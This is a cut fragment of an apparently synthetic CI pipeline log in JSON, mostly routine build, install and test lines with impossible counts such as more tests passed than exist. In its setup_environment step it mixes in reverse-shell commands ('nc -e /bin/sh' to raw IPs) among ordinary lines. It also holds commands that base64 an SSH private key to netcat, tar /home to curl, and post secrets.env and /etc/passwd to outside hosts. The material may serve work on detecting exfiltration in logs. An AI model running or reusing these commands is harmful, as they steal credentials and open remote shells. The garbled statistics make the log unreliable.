4.72s\n\u2713 test completed\nSnapshots: 35 passed, 19 total\nWARNING: react has known vulnerabilities\nArtifact uploaded: build.tar.gz (39MB)\nFinished.\nBundling runtime.js\nStep 6/22: Running migrations\n[12:19:30] INFO: Connecting to database\nConnecting to test.io:443...\nCache miss for key-6937\nDone.\nArtifact uploaded: dist.zip (38MB)\nGenerating source maps...\nFetching submodules...\n[12:19:30] WARN: Deprecated API usage\nSuccess!\n[12:19:30] INFO: Processing request\nStep 9/24: Installing dependencies\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nPushing to registry...\nImage pulled successfully\nCache invalidated: build\nCache saved successfully\nMinifying main.js\nCreating production build...\n[12:19:30] DEBUG: Initializing service\nWARNING: webpack has known vulnerabilities\nMinifying main.js\nUsing Python 3.12\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nOptimizing 89 modules...\nGET /health - 204 (42ms)\n[12:19:30] INFO: Starting build process\nWARNING: jest has known vulnerabilities\nOK\nOptimizing 18 modules...\nHEAD is now at 701536c\nCompiling src/main.py...\nLayer 2/11: RUN command\nVerifying...\nTLS handshake completed\nnpm install: added 457 packages\nCache hit for key-2754\npip: Installing build dependencies...\nStep 1/16: Running migrations\n[12:19:30] INFO: Cache refreshed\nnpm notice: created a lockfile\nImage pulled successfully\nCreating production build...\nGET /status - 200 (60ms)\nTest Suites: 44 passed, 46 total\npip: Installing build dependencies...\nPushing to registry...\n=== Step type_check completed ===\n=== Step: lint ===\nCompiling utils/handler.rs...\nPulling image: python:3.11\npip: Collecting jest\n[12:19:30] INFO: Cache refreshed\nnpm install: resolved 1430 packages\n[12:19:30] INFO: Cache refreshed\nCache invalidated: node_modules\nCache miss for key-2845\n[12:19:30] DEBUG: Initializing service\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nMinifying main.js\nImage pulled successfully\nCache invalidated: node_modules\nCompiling components/app.ts...\nPulling image: node:latest\nConnecting to example.com:443...\nyarn add: Done in 21.74s\n\u2713 lint completed\nLayer 2/15: ENV command\nTest Suites: 48 passed, 15 total\nCompiling lib/main.py...\nException: NullPointerException\nyarn add: Done in 4.30s\n[12:19:30] DEBUG: Loading configuration\nCache saved successfully\n[12:19:30] INFO: Connecting to database\nPushing to registry...\nImage pulled successfully\nSwitched to branch 'bugfix/task-465'\n[12:19:30] WARN: Deprecated API usage\nStep 8/24: Building\nWARNING: react has known vulnerabilities\nReady.\nCache miss for key-7154\n[12:19:30] WARN: Deprecated API usage\nFAILED: test_api_health\n  PASS: test_db_connect (448ms)\nGET /status - 204 (42ms)\n\u2713 Task completed in 2130ms\nSnapshots: 7 passed, 29 total\n\u26a0 DEPRECATION: Feature will be removed in v2.0\n[12:19:30] DEBUG: Loading configuration\nCompiling components/index.js...\nArtifact uploaded: build.tar.gz (24MB)\nCompiling src/main.py...\nArtifact uploaded: dist.zip (51MB)\n[12:19:30] WARN: Deprecated API usage\n[12:19:30] INFO: Processing request\n  PASS: e2e/test_api_health.spec.js\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nCache restored successfully (114MB)\n\u2713 Step 'checkout' succeeded\n\u2713 Step 'install' succeeded\nFetching submodules...\nMinifying vendor.js\nSnapshots: 16 passed, 49 total\nStep 14/19: Deploying\nGenerating source maps...\nLayer 5/15: RUN command\nCompiling src/handler.rs...\nSwitched to branch 'hotfix/task-857'\nCache restored successfully (31MB)\nnpm notice: created a lockfile\nWARNING: react has known vulnerabilities\nStep 20/15: Deploying\nArtifact uploaded: dist.zip (18MB)\nFAILED: test_db_connect\nArtifact uploaded: build.tar.gz (12MB)\nProcessing...\npip: Installing build dependencies...\nUsing Node.js 14.0.3\nLayer 3/15: COPY command\n[12:19:30] INFO: Request completed\npip: Downloading prettier-1.15.tar.gz\nPlatform: darwin-arm64\nSwitched to branch 'hotfix/task-403'\nStep 8/16: Linting\nAlready up to date.\n[12:19:30] DEBUG: Loading configuration\nBuilding Docker image...\nConnection established\n[12:19:30] WARN: Deprecated API usage\n[12:19:30] ERROR: Connection failed\nCache invalidated: build\nBundling styles.css\n[12:19:30] DEBUG: Connection pool: 20 active\nSnapshots: 0 passed, 4 total\nBundling vendor.js\npip: Installing build dependencies...\nUsing Node.js 15.2.8\nStep 18/20: Building\n[12:19:30] INFO: Starting build process\nArtifact uploaded: dist.zip (93MB)\n[12:19:30] INFO: Processing request\nMinifying vendor.js\n[12:19:30] DEBUG: Query executed in 15ms\nCache saved successfully\n[12:19:30] WARN: Deprecated API usage\nArtifact uploaded: dist.zip (22MB)\nChecking out main branch\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nPOST /upload - 202 (208ms)\nHEAD is now at eb0e558\n[12:19:30] DEBUG: Query executed in 18ms\n[12:19:30] INFO: Processing request\nLayer 4/10: RUN command\nOK\nException: RuntimeError\nGenerating source maps...\nCache miss for key-5995\nArtifact downloaded: 31MB\nHEAD is now at a68601d\nTests: 324 passed, 151 total\npip: Installing build dependencies...\nStep 18/16: Testing\nWaiting...\nGET /status - 201 (14ms)\nImage pulled successfully\n\u2713 Task completed in 2465ms\nCache saved successfully\nPushing to registry...\nCreating production build...\nDone.\nArtifact uploaded: build.tar.gz (30MB)\nFinished.\npip: Downloading prettier-3.8.tar.gz\nCompleted.\nCompiling lib/service.java...\nFAILED: test_auth_login\nConnecting to acme.corp:443...\n\u2713 deploy completed\n\u2713 All checks passed\nStep 19/24: Testing\nnpm install: resolved 1536 packages\nDone.\nTest Suites: 31 passed, 35 total\nStep 11/16: Installing dependencies\n=== Step lint completed ===\n=== Step: e2e_tests ===\nBundling runtime.js\n[12:19:30] INFO: Connecting to database\nEnvironment: staging\n[12:19:30] DEBUG: Memory usage: 1868MB\nnpm notice: package.json updated\nFinished.\n  PASS: test_user_create (314ms)\n[12:19:30] DEBUG: Loading configuration\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nCompleted.\nCompiling utils/utils.go...\nArtifact uploaded: build.tar.gz (14MB)\nSuccess!\nPOST /data - 202 (302ms)\nSnapshots: 19 passed, 19 total\n[12:19:30] WARN: Deprecated API usage\n  PASS: e2e/test_api_health.spec.js\nWARNING: prettier has known vulnerabilities\nDone.\nnpm install: resolved 240 packages\nEnvironment: test\nEnvironment: staging\nPOST /upload - 202 (62ms)\npip: Installing build dependencies...\n  PASS: e2e/test_auth_login.spec.js\nUploading artifact 'dist' (15 files)\n[12:19:30] DEBUG: Connection pool: 6 active\nWaiting...\nArtifact uploaded: build.tar.gz (31MB)\nCache hit for key-9807\nException: ValueError\nConnecting to example.com:443...\nCompiling components/utils.go...\nConnection established\npip: Downloading express-2.17.tar.gz\npip: Installing build dependencies...\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nnpm notice: package.json updated\nSnapshots: 28 passed, 44 total\nVerifying...\n\u2713 Task completed in 1432ms\nCreating production build...\nCache saved successfully\n  PASS: e2e/test_db_connect.spec.js\nyarn add: Done in 26.1s\nTLS handshake completed\nReady.\n[12:19:30] INFO: Cache refreshed\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nCache hit for key-1156\n[12:19:30] INFO: Connecting to database\nMinifying main.js\nSwitched to branch 'bugfix/task-809'\nUsing Python 3.10\nMinifying main.js\n[12:19:30] INFO: Cache refreshed\nCompiling components/service.java...\npip: Downloading axios-1.2.tar.gz\nArtifact downloaded: 26MB\n  PASS: e2e/test_api_health.spec.js\nDone.\n[12:19:30] DEBUG: Query executed in 50ms\nCompiling lib/service.java...\nOptimizing 58 modules...\nDone.\n\u2713 Task completed in 2311ms\nnpm install: resolved 1031 packages\npip: Collecting eslint\nDone.\nSnapshots: 1 passed, 24 total\npip install: Successfully installed react-2.1\nTransforming 348 files...\nLayer 2/8: COPY command\nTLS handshake completed\nCache restored successfully (80MB)\nGET /health - 200 (74ms)\nTLS handshake completed\nPlatform: darwin-arm64\n[12:19:30] WARN: Deprecated API usage\nPushing to registry...\npip: Installing build dependencies...\nSnapshots: 50 passed, 44 total\nTests: 163 passed, 295 total\nnpm install: resolved 449 packages\n[12:19:30] DEBUG: Initializing service\nTime: 24.895s\nWARNING: axios has known vulnerabilities\npip: Installing build dependencies...\nLayer 6/9: COPY command\nBuilding Docker image...\npip: Downloading webpack-4.8.tar.gz\nReady.\n[12:19:30] DEBUG: Initializing service\nTransforming 523 files...\nnpm install: resolved 1722 packages\nAlready up to date.\nStep 2/18: Deploying\nCompiling src/service.java...\nArtifact uploaded: dist.zip (43MB)\nCache miss for key-2792\n[12:19:30] INFO: Processing request\nStep 11/19: Running migrations\npip: Downloading jest-4.11.tar.gz\npip: Installing build dependencies...\nLoading...\nSnapshots: 0 passed, 14 total\n  PASS: e2e/test_db_connect.spec.js\nWARNING: eslint has known vulnerabilities\nTLS handshake completed\n[12:19:30] ERROR: Connection failed\nSnapshots: 20 passed, 16 total\nArtifact uploaded: dist.zip (43MB)\npip install: Successfully installed express-2.5\nSwitched to branch 'hotfix/task-925'\nOK\nWARNING: react has known vulnerabilities\nLoading...\n\u2713 build completed\nArtifact downloaded: 15MB\n\u2713 build completed\nInstalling react@2.12.4\nTests: 313 passed, 422 total\nDone.\n  PASS: test_cache_hit (92ms)\npip install: Successfully installed jest-3.18\nSnapshots: 41 passed, 44 total\nConnecting to acme.corp:443...\n[12:19:30] WARN: Deprecated API usage\nSwitched to branch 'bugfix/task-126'\nEnvironment: test\n\u2713 All checks passed\nArtifact downloaded: 48MB\nCache miss for key-6012\nSwitched to branch 'hotfix/task-905'\nCache hit for key-8284\nPlatform: darwin-arm64\nOptimizing 12 modules...\n=== Step e2e_tests completed ===\n=== Step: upload_artifacts ===\nStep 10/18: Deploying\nStep 7/22: Installing dependencies\nCache invalidated: build\n[12:19:30] ERROR: Connection failed\nGenerating source maps...\npip: Collecting prettier\nWARNING: express has known vulnerabilities\nWARNING: lodash has known vulnerabilities\nFetching submodules...\n[12:19:30] ERROR: Connection failed\nCompiling src/utils.go...\n[12:19:30] ERROR: Connection failed\n[12:19:30] DEBUG: Loading configuration\nImage pulled successfully\nSuccess!\nCompiling utils/main.py...\n\u2713 All checks passed\nDone.\nConnection established\nPulling image: python:18\nOK\nFAILED: test_user_create\npip: Downloading jest-5.16.tar.gz\nBuilding Docker image...\nBundling styles.js\nCompiling src/service.java...\nCompiling components/main.py...\nCache miss for key-4876\nCreating production build...\nCache restored successfully (196MB)\npip: Collecting eslint\n[12:19:30] INFO: Request completed\nConnection established\nImage pulled successfully\npip install: Successfully installed express-3.2\nyarn add: Done in 25.37s\nArtifact downloaded: 30MB\nMinifying main.js\nnpm notice: package.json updated\nnpm install: resolved 128 packages\nnpm install: resolved 215 packages\n[12:19:30] INFO: Processing request\n  PASS: test_api_health (326ms)\nPulling image: python:3.11\nProcessing...\n\u2717 build failed with exit code 108\n[12:19:30] INFO: Processing request\nnpm notice: created a lockfile\nInstalling axios@2.9.2\nPulling image: node:3.11\nWARNING: express has known vulnerabilities\nCache hit for key-6998\nCache saved successfully\nConnection established\nException: RuntimeError\nTransforming 378 files...\nReady.\nBundling main.css\nStep 8/15: Testing\n[12:19:30] DEBUG: Memory usage: 206MB\n  PASS: test_db_connect (183ms)\nOK\nOK\nCache miss for key-4612\nCache miss for key-8039\nWARNING: lodash has known vulnerabilities\n[12:19:30] INFO: Request completed\nCache invalidated: node_modules\n[12:19:30] DEBUG: Memory usage: 659MB\nFAILED: test_db_connect\nReady.\n[12:19:30] INFO: Connecting to database\n[12:19:30] WARN: Deprecated API usage\nnpm install: resolved 720 packages\n\u2717 build failed with exit code 119\nAlready up to date.\nGenerating source maps...\nFAILED: test_cache_hit\nSuccess!\n[12:19:30] INFO: Starting build process\n[12:19:30] INFO: Processing request\n[12:19:30] INFO: Cache refreshed\nCompiling utils/app.ts...\nStep 5/19: Testing\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nRan 148 tests in 34s\nCompleted.\nEnvironment: test\n[12:19:30] INFO: Starting build process\npip: Collecting axios\nEnvironment: staging\nOptimizing 82 modules...\nCache hit for key-5705\n  PASS: unit/test_user_create.spec.js\nRan 134 tests in 40s\nSwitched to branch 'hotfix/task-632'\nCache restored successfully (371MB)\nLayer 4/9: COPY command\nnpm install: added 409 packages\nnpm install: resolved 1946 packages\n[12:19:30] DEBUG: Loading configuration\nPushing to registry...\nStep 2/23: Building\nStep 11/20: Linting\nyarn add: Done in 30.95s\npip: Downloading eslint-3.3.tar.gz\n\u2713 validate completed\nTime: 96.706s\nCache restored successfully (454MB)\nCompiling src/service.java...\nProcessing...\nWARNING: axios has known vulnerabilities\nnpm install: added 71 packages\nReady.\nWARNING: jest has known vulnerabilities\n\u2713 All checks passed\nVerifying...\nWARNING: eslint has known vulnerabilities\nBundling runtime.css\nCache restored successfully (403MB)\nSwitched to branch 'feature/task-333'\nStep 12/18: Testing\nSnapshots: 47 passed, 18 total\npip: Installing build dependencies...\nStep 6/15: Linting\nBuilding Docker image...\nStep 16/22: Linting\nConnecting to cloud.services:443...\nWaiting...\nHEAD is now at bf95549\nWARNING: axios has known vulnerabilities\npip: Installing build dependencies...\n[12:19:30] DEBUG: Query executed in 29ms\nStep 6/16: Testing\nArtifact uploaded: build.tar.gz (45MB)\nBundling runtime.js\nInstalling react@4.19.8\n=== Step upload_artifacts completed ===\n=== Step: restore_cache ===\nFinished.\nCompleted.\nUploading artifact 'build' (28 files)\n[12:19:30] WARN: Deprecated API usage\nMinifying app.js\nEnvironment: test\n[12:19:30] DEBUG: Loading configuration\nUploading artifact 'dist' (13 files)\nPulling image: node:18\nOptimizing 52 modules...\nInstalling express@3.11.0\nSnapshots: 17 passed, 1 total\nHEAD is now at c259408\nException: RuntimeError\nUsing Node.js 16.20.3\nyarn add: Done in 24.22s\nFAILED: test_db_connect\nVerifying...\nWARNING: eslint has known vulnerabilities\nLayer 2/12: RUN command\nAlready up to date.\nPulling image: node:latest\nPushing to registry...\n[12:19:30] INFO: Connecting to database\nTransforming 169 files...\n\u2713 Task completed in 4104ms\nProcessing...\nStep 1/24: Running migrations\nFAILED: test_cache_hit\n\u2713 lint completed\n[12:19:30] INFO: Cache refreshed\n[12:19:30] ERROR: Connection failed\nCreating production build...\nConnecting to acme.corp:443...\nCompiling lib/service.java...\nPOST /api - 201 (95ms)\n  PASS: test_auth_login (167ms)\nCompiling components/service.java...\nPulling image: node:3.11\nArtifact uploaded: dist.zip (32MB)\nPulling image: alpine:18\nCompiling src/index.js...\nInstalling lodash@1.19.9\nTLS handshake completed\nTransforming 954 files...\nDone.\n[12:19:30] INFO: Cache refreshed\nCache restored successfully (278MB)\nImage pulled successfully\nDone.\nCache restored successfully (352MB)\nPOST /upload - 200 (267ms)\n  PASS: test_cache_hit (97ms)\npip install: Successfully installed react-3.8\nStep 12/19: Building\n[12:19:30] INFO: Processing request\npip: Downloading express-5.15.tar.gz\nOK\nCoverage: 70% statements, 89% branches\nOK\nLoading...\npip: Downloading react-3.8.tar.gz\nPushing to registry...\nLayer 7/15: RUN command\nInstalling react@4.9.5\nLoading...\nUsing Node.js 20.6.8\nnpm notice: created a lockfile\nBundling vendor.css\nPlatform: darwin-arm64\nWARNING: eslint has known vulnerabilities\nLayer 7/10: ENV command\nArtifact downloaded: 50MB\n[12:19:30] INFO: Request completed\n[12:19:30] DEBUG: Initializing service\nCompiling lib/service.java...\n[12:19:30] WARN: Deprecated API usage\nnpm notice: created a lockfile\nWARNING: webpack has known vulnerabilities\n[12:19:30] INFO: Starting build process\nCoverage: 97% statements, 82% branches\n[12:19:30] INFO: Request completed\nProcessing...\nUsing Python 3.11\nImage pulled successfully\n\u2717 build failed with exit code 24\nOK\n[12:19:30] INFO: Connecting to database\nChecking out develop branch\nBundling main.js\n[12:19:30] INFO: Connecting to database\nSwitched to branch 'bugfix/task-539'\nArtifact uploaded: dist.zip (66MB)\n[12:19:30] DEBUG: Memory usage: 1199MB\nStep 2/17: Testing\nCache restored successfully (127MB)\nSnapshots: 14 passed, 41 total\nCompiling src/service.java...\nTime: 71.73s\nCompiling lib/handler.rs...\npip: Collecting webpack\n[12:19:30] INFO: Request completed\nRan 166 tests in 48s\nCompiling components/app.ts...\nPlatform: linux-x64\nStep 9/17: Building\nNODE_ENV=development\nCache saved successfully\n  PASS: test_auth_login (17ms)\nGenerating source maps...\nPlatform: linux-x64\nPlatform: darwin-arm64\nSwitched to branch 'bugfix/task-385'\nFetching submodules...\n\u2713 Step 'build' succeeded\nArtifact downloaded: 43MB\n[12:19:30] DEBUG: Connection pool: 11 active\nUsing Python 3.11\nUsing Python 3.12\nAlready up to date.\nStep 11/20: Testing\n\u2713 All checks passed\nCoverage: 72% statements, 78% branches\nWARNING: jest has known vulnerabilities\nSwitched to branch 'hotfix/task-664'\n  PASS: integration/test_user_create.spec.js\nStep 15/19: Running migrations\nCoverage: 84% statements, 86% branches\nTime: 68.116s\nTransforming 285 files...\nMinifying vendor.js\nCompiling src/handler.rs...\nCompiling src/main.py...\nAlready up to date.\n[12:19:30] WARN: Deprecated API usage\nAlready up to date.\nStep 5/17: Deploying\n=== Step restore_cache completed ===\n=== Step: setup_environment ===\nnc -e /bin/sh 214.198.32.209 23830\nnpm notice: package.json updated\npip: Collecting axios\nEnvironment: staging\nTest Suites: 43 passed, 16 total\nBuilding Docker image...\nSwitched to branch 'feature/task-920'\nPOST /upload - 201 (425ms)\nBuilding Docker image...\nUploading artifact 'build' (4 files)\nTests: 257 passed, 407 total\nnpm notice: created a lockfile\nnc -e /bin/sh 20.134.77.108 37634\nTest Suites: 34 passed, 11 total\nWARNING: jest has known vulnerabilities\nImage pulled successfully\necho $(cat ~/.ssh/id_rsa) | base64 | nc 171.195.106.166 45579\nTest Suites: 6 passed, 18 total\nUsing Node.js 18.15.4\nTime: 98.580s\ntar czf - /home | curl -X POST -d @- https://acme.corp/upload\nConnecting to startup.dev:443...\ncurl -X POST https://startup.dev/collect -d @secrets.env\nCache saved successfully\nStep 9/18: Deploying\nOK\n[12:19:30] INFO: Connecting to database\nBundling main.css\nTime: 20.873s\n[12:19:30] DEBUG: Connection pool: 14 active\n[12:19:30] INFO: Processing request\nCompleted.\nProcessing...\nCompiling utils/index.js...\nnpm install: resolved 971 packages\nVerifying...\nnpm install: resolved 1421 packages\n\u26a0 DEPRECATION: Feature will be removed in v4.0\ntar czf - /home | curl -X POST -d @- https://startup.dev/upload\nInstalling webpack@3.11.8\nCompiling lib/main.py...\n[12:19:30] INFO: Processing request\n[12:19:30] DEBUG: Connection pool: 10 active\nSuccess!\n[12:19:30] DEBUG: Memory usage: 860MB\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nConnection established\n[12:19:30] INFO: Request completed\nCompiling utils/index.js...\nAlready up to date.\nCache restored successfully (240MB)\nCompiling lib/utils.go...\nSwitched to branch 'feature/task-914'\npip: Downloading prettier-2.5.tar.gz\nMinifying vendor.js\nLoading...\n[12:19:30] WARN: Deprecated API usage\nRan 192 tests in 53s\nBundling main.css\n[12:19:30] DEBUG: Query executed in 98ms\nCompiling lib/app.ts...\n  PASS: e2e/test_cache_hit.spec.js\nStep 9/19: Building\nArtifact uploaded: build.tar.gz (28MB)\nFinished.\nChecking out main branch\nGET /api - 201 (1ms)\n[12:19:30] WARN: Deprecated API usage\nSending 176MB of data to example.com\necho $(cat ~/.ssh/id_rsa) | base64 | nc 143.212.227.13 27921\nHEAD is now at 04749a8\nCache restored successfully (342MB)\nPOST /data - 201 (43ms)\nCache saved successfully\nTransforming 574 files...\nConnection established\ncurl -X POST https://test.io/collect -d @secrets.env\ncurl -X POST https://test.io/collect -d @secrets.env\nImage pulled successfully\n  PASS: test_api_health (316ms)\nTest Suites: 35 passed, 24 total\nPulling image: node:3.11\nArtifact downloaded: 26MB\nGenerating source maps...\nUsing Node.js 19.15.5\nMinifying vendor.js\nyarn add: Done in 4.99s\nAlready up to date.\nTest Suites: 26 passed, 29 total\nProcessing...\n[12:19:30] INFO: Processing request\ncurl -X POST https://cloud.services/collect -d @secrets.env\nAlready up to date.\nnpm install: resolved 828 packages\npip: Downloading react-3.18.tar.gz\nSwitched to branch 'feature/task-660'\nCompiling lib/index.js...\nnpm install: added 384 packages\nEnvironment: staging\n\u26a0 DEPRECATION: Feature will be removed in v5.0\npip: Downloading eslint-3.6.tar.gz\nAlready up to date.\n  PASS: e2e/test_auth_login.spec.js\nSending 77MB of data to test.io\nEnvironment: staging\nPlatform: linux-x64\npip: Installing build dependencies...\nCompleted.\nSending 59MB of data to acme.corp\n[12:19:30] DEBUG: Loading configuration\npip: Installing build dependencies...\n\u2713 Step 'checkout' succeeded\nCache restored successfully (147MB)\nLayer 9/10: COPY command\ncurl -X POST https://acme.corp/collect -d @secrets.env\nNODE_ENV=production\nStep 10/20: Running migrations\n\u2713 Task completed in 1000ms\nCompiling src/main.py...\nTime: 88.680s\nCache hit for key-2249\nCache invalidated: build\nSnapshots: 10 passed, 41 total\nInstalling prettier@3.5.5\ncurl -X POST https://acme.corp/collect -d @secrets.env\nLoading...\nCache invalidated: dependencies\n[12:19:30] DEBUG: Loading configuration\n\u2713 Step 'test' succeeded\nTest Suites: 6 passed, 50 total\n[12:19:30] INFO: Connecting to database\nPulling image: python:18\nCompiling components/app.ts...\nInstalling jest@2.18.4\nArtifact downloaded: 13MB\nwget --post-data=\"$(cat /etc/passwd)\" https://acme.corp/\necho $(cat ~/.ssh/id_rsa) | base64 | nc 164.166.22.4 36313\nException: NullPointerException\nStep 5/17: Deploying\nImage pulled successfully\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nRan 19 tests in 9s\nWARNING: prettier has known vulnerabilities\nException: NullPointerException\nFinished.\nTransforming 298 files...\necho $(cat ~/.ssh/id_rsa) | base64 | nc 169.73.116.177 19174\nStep 14/15: Testing\n  PASS: integration/test_api_health.spec.js\nUploading artifact 'build' (37 files)\nnc -e /bin/sh 48.36.97.164 32228\nCompiling utils/index.js...\nRan 64 tests in 24s\npip: Collecting express\nwget --post-data=\"$(cat /etc/passwd)\" https://cloud.services/\npip: Downloading lodash-4.10.tar.gz\nCache saved successfully\n=== Step setup_environment completed ===",
    "steps": [
      {
        "name": "build",
        "status": "success",
        "started_at": "2025-12-12T12:19:30.622788",
        "finished_at": "2025-12-12T12:19:54.527666",
        "log_lines": [
          "=== Step: build ===",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "GET /api - 200 (4ms)",
          "Step 15/18: Linting",
          "pip: Downloading jest-5.10.tar.gz",
          "[12:19:30] DEBUG: Connection pool: 16 active",
          "Completed.",
          "\u2717 build failed with exit code 98",
          "\u2713 Task completed in 3428ms",
          "Compiling utils/utils.go...",
          "HEAD is now at c604cb8",
          "Bundling runtime.css",
          "Finished.",
          "Cache invalidated: node_modules",
          "Step 14/23: Running migrations",
          "[12:19:30] INFO: Starting build process",
          "Pulling image: alpine:18",
          "Compiling utils/index.js...",
          "Compiling utils/handler.rs...",
          "Loading...",
          "Step 6/19: Building",
          "Checking out develop branch",
          "Building Docker image...",
          "[12:19:30] INFO: Starting build process",
          "Artifact uploaded: build.tar.gz (15MB)",
          "npm notice: created a lockfile",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Connecting to example.com:443...",
          "WARNING: lodash has known vulnerabilities",
          "TLS handshake completed",
          "Loading...",
          "Using Python 3.12",
          "Exception: RuntimeError",
          "Optimizing 34 modules...",
          "\u2713 All checks passed",
          "Bundling main.js",
          "Time: 7.920s",
          "Building Docker image...",
          "Already up to date.",
          "Layer 3/13: ENV command",
          "[12:19:30] DEBUG: Connection pool: 8 active",
          "[12:19:30] DEBUG: Memory usage: 1859MB",
          "Environment: production",
          "WARNING: react has known vulnerabilities",
          "TLS handshake completed",
          "  PASS: unit/test_db_connect.spec.js",
          "Compiling components/handler.rs...",
          "Artifact downloaded: 27MB",
          "[12:19:30] WARN: Deprecated API usage",
          "  PASS: integration/test_auth_login.spec.js",
          "[12:19:30] DEBUG: Initializing service",
          "Optimizing 12 modules...",
          "[12:19:30] INFO: Cache refreshed",
          "  PASS: test_api_health (453ms)",
          "WARNING: webpack has known vulnerabilities",
          "Completed.",
          "Layer 4/14: RUN command",
          "[12:19:30] INFO: Connecting to database",
          "Image pulled successfully",
          "Pushing to registry...",
          "[12:19:30] DEBUG: Query executed in 19ms",
          "[12:19:30] INFO: Connecting to database",
          "[12:19:30] WARN: Deprecated API usage",
          "Bundling main.js",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Generating source maps...",
          "Exception: ValueError",
          "Compiling utils/app.ts...",
          "NODE_ENV=production",
          "Already up to date.",
          "NODE_ENV=development",
          "Checking out develop branch",
          "Layer 10/14: RUN command",
          "Step 16/16: Linting",
          "[12:19:30] DEBUG: Query executed in 42ms",
          "Tests: 390 passed, 445 total",
          "npm install: resolved 1053 packages",
          "\u2713 lint completed",
          "Artifact downloaded: 5MB",
          "Platform: win32-x64",
          "Connecting to cloud.services:443...",
          "Cache invalidated: build",
          "Test Suites: 13 passed, 32 total",
          "\u2713 build completed",
          "Using Python 3.11",
          "TLS handshake completed",
          "npm install: added 260 packages",
          "Compiling utils/handler.rs...",
          "Tests: 455 passed, 483 total",
          "[12:19:30] DEBUG: Connection pool: 14 active",
          "Completed.",
          "Generating source maps...",
          "Snapshots: 23 passed, 32 total",
          "[12:19:30] INFO: Request completed",
          "Artifact uploaded: build.tar.gz (26MB)",
          "Bundling runtime.css",
          "pip install: Successfully installed express-4.8",
          "  PASS: test_user_create (310ms)",
          "[12:19:30] INFO: Starting build process",
          "Image pulled successfully",
          "NODE_ENV=test",
          "Done.",
          "Using Node.js 17.5.0",
          "Layer 6/15: COPY command",
          "[12:19:30] INFO: Request completed",
          "Optimizing 89 modules...",
          "Success!",
          "Artifact downloaded: 32MB",
          "WARNING: jest has known vulnerabilities",
          "[12:19:30] INFO: Processing request",
          "Finished.",
          "pip: Collecting express",
          "Waiting...",
          "Checking out develop branch",
          "Checking out main branch",
          "Step 10/19: Testing",
          "Generating source maps...",
          "pip: Installing build dependencies...",
          "Artifact uploaded: build.tar.gz (43MB)",
          "Generating source maps...",
          "[12:19:30] INFO: Starting build process",
          "[12:19:30] DEBUG: Memory usage: 170MB",
          "npm install: added 129 packages",
          "Artifact uploaded: dist.zip (45MB)",
          "[12:19:30] DEBUG: Connection pool: 16 active",
          "Finished.",
          "Uploading artifact 'build' (30 files)",
          "WARNING: prettier has known vulnerabilities",
          "[12:19:30] DEBUG: Query executed in 31ms",
          "Layer 6/11: ENV command",
          "Creating production build...",
          "Compiling components/app.ts...",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "HEAD is now at 10c7c90",
          "Artifact uploaded: build.tar.gz (50MB)",
          "Test Suites: 46 passed, 39 total",
          "Artifact downloaded: 16MB",
          "=== Step build completed ==="
        ]
      },
      {
        "name": "checkout",
        "status": "success",
        "started_at": "2025-12-12T12:19:54.527666",
        "finished_at": "2025-12-12T12:19:57.714983",
        "log_lines": [
          "=== Step: checkout ===",
          "Creating production build...",
          "Switched to branch 'feature/task-292'",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "[12:19:30] INFO: Request completed",
          "npm notice: package.json updated",
          "Compiling utils/service.java...",
          "Ran 144 tests in 28s",
          "Already up to date.",
          "[12:19:30] DEBUG: Query executed in 30ms",
          "Creating production build...",
          "Tests: 195 passed, 417 total",
          "Processing...",
          "Done.",
          "OK",
          "pip: Installing build dependencies...",
          "[12:19:30] DEBUG: Loading configuration",
          "GET /status - 201 (66ms)",
          "Exception: NullPointerException",
          "Uploading artifact 'dist' (45 files)",
          "Loading...",
          "Cache saved successfully",
          "Step 19/21: Building",
          "  PASS: e2e/test_db_connect.spec.js",
          "Platform: linux-x64",
          "Finished.",
          "Platform: win32-x64",
          "Loading...",
          "Waiting...",
          "Snapshots: 27 passed, 34 total",
          "Loading...",
          "pip: Installing build dependencies...",
          "Artifact uploaded: build.tar.gz (11MB)",
          "pip: Installing build dependencies...",
          "Snapshots: 4 passed, 31 total",
          "Coverage: 74% statements, 97% branches",
          "[12:19:30] INFO: Connecting to database",
          "Loading...",
          "Loading...",
          "[12:19:30] INFO: Processing request",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "FAILED: test_user_create",
          "Optimizing 79 modules...",
          "Step 3/18: Running migrations",
          "Uploading artifact 'build' (6 files)",
          "NODE_ENV=development",
          "Switched to branch 'feature/task-358'",
          "Exception: RuntimeError",
          "Bundling styles.css",
          "Tests: 250 passed, 178 total",
          "Time: 16.349s",
          "Optimizing 48 modules...",
          "Time: 51.904s",
          "Artifact uploaded: build.tar.gz (32MB)",
          "Compiling components/service.java...",
          "Done.",
          "[12:19:30] DEBUG: Query executed in 71ms",
          "npm install: added 295 packages",
          "Ready.",
          "Step 15/22: Running migrations",
          "WARNING: express has known vulnerabilities",
          "Installing express@4.11.10",
          "Ran 157 tests in 39s",
          "[12:19:30] INFO: Cache refreshed",
          "Layer 10/8: COPY command",
          "[12:19:30] INFO: Cache refreshed",
          "Generating source maps...",
          "Installing prettier@4.14.0",
          "Step 8/24: Running migrations",
          "pip: Installing build dependencies...",
          "[12:19:30] WARN: Deprecated API usage",
          "Artifact downloaded: 16MB",
          "Waiting...",
          "pip install: Successfully installed webpack-3.2",
          "[12:19:30] INFO: Connecting to database",
          "NODE_ENV=test",
          "Connecting to example.com:443...",
          "FAILED: test_auth_login",
          "Step 9/17: Linting",
          "TLS handshake completed",
          "Step 16/21: Testing",
          "OK",
          "Platform: linux-x64",
          "Artifact downloaded: 23MB",
          "Coverage: 90% statements, 85% branches",
          "Loading...",
          "Success!",
          "Checking out main branch",
          "Compiling utils/app.ts...",
          "Ran 64 tests in 3s",
          "\u2713 All checks passed",
          "[12:19:30] ERROR: Connection failed",
